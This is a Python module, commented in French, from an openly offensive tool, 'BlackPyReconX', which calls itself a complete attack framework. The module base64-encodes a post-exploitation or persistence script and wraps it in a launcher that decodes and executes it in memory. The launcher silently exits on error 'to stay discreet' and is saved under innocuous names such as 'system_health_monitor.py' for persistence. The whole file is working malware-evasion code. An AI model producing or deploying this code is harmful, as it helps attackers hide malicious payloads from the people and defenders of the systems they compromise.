# BlackPyReconX - Un framework d'attaque complet
# Copyright (C) 2025 Hermann KEKE
#
# Ce programme est un logiciel libre ; vous pouvez le redistribuer et/ou le
# modifier selon les termes de la Licence publique générale GNU telle que
# publiée par la Free Software Foundation ; soit la version 3 de la Licence,
# soit (à votre choix) toute version ultérieure.
#
# Ce programme est distribué dans l'espoir qu'il sera utile,
# mais SANS AUCUNE GARANTIE ; sans même la garantie implicite de
# QUALITÉ MARCHANDE ou d'ADÉQUATION À UN USAGE PARTICULIER. Voir la
# Licence publique générale GNU pour plus de détails.
#
# Vous devriez avoir reçu une copie de la Licence publique générale GNU
# avec ce programme. Si non, voir <https://www.gnu.org/licenses/>.

import base64
import os

# Modèle pour le script "lanceur" qui sera généré
LAUNCHER_TEMPLATE = """
import base64
import sys

# Le code suivant est le script original, encodé en Base64 pour l'évasion.
ENCODED_SCRIPT = {encoded_script}

try:
    # Décodage et exécution du script en mémoire
    decoded_script = base64.b64decode(ENCODED_SCRIPT).decode('utf-8')
    exec(decoded_script)
except Exception:
    # En cas d'erreur, ne rien faire pour rester discret
    sys.exit()
"""

def obfuscate_script(script_path: str, output_filename: str = "update_check.py") -> str:
    """Obfusque un script Python en l'encodant en Base64 et en créant un lanceur."""
    print(f"[*] Tentative d'obfuscation du script : {script_path}")

    try:
        with open(script_path, 'rb') as f:
            original_script_content = f.read()
        
        # Encoder le contenu du script en Base64
        encoded_content = base64.b64encode(original_script_content)
        
        # Créer le contenu du lanceur en injectant le script encodé
        launcher_content = LAUNCHER_TEMPLATE.format(encoded_script=encoded_content)
        
        # Déterminer le chemin de sortie (à côté du script original)
        output_path = os.path.join(os.path.dirname(script_path), output_filename)
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(launcher_content)
            
        print(f"[+] Script obfusqué avec succès.")
        print(f"[+] Le lanceur a été sauvegardé sous : {output_path}")
        return output_path

    except FileNotFoundError:
        print(f"[-] Erreur : Le fichier {script_path} n'a pas été trouvé.")
        return None
    except Exception as e:
        print(f"[-] Une erreur est survenue lors de l'obfuscation : {e}")
        return None

# --- FONCTION PRINCIPALE DU MODULE ---
def run(script_to_hide=None):
    """Fonction principale pour le module d'évasion."""
    print("[+] Lancement du module d'évasion...")

    if script_to_hide is None:
        # Par défaut, on tente d'obfusquer le module de post-exploitation (exploit_sys.py)
        # car c'est souvent celui qu'on veut rendre persistant et discret.
        script_to_hide = os.path.join(os.path.dirname(__file__), 'exploit_sys.py')
        print(f"[*] Aucun script spécifié. Cible par défaut : {script_to_hide}")

    if not os.path.exists(script_to_hide):
        print(f"[-] Le script à obfusquer n'existe pas : {script_to_hide}")
        return

    # Utiliser un nom de fichier qui semble légitime
    obfuscated_launcher_path = obfuscate_script(script_to_hide, output_filename="system_health_monitor.py")

    if obfuscated_launcher_path:
        print("[*] Pour la persistance, utilisez maintenant le script suivant :")
        print(f"  python \"{obfuscated_launcher_path}\"")

if __name__ == '__main__':
    # Exemple d'utilisation : obfusquer le module de persistance lui-même
    persistence_script = os.path.join(os.path.dirname(__file__), 'persistence.py')
    run(script_to_hide=persistence_script)
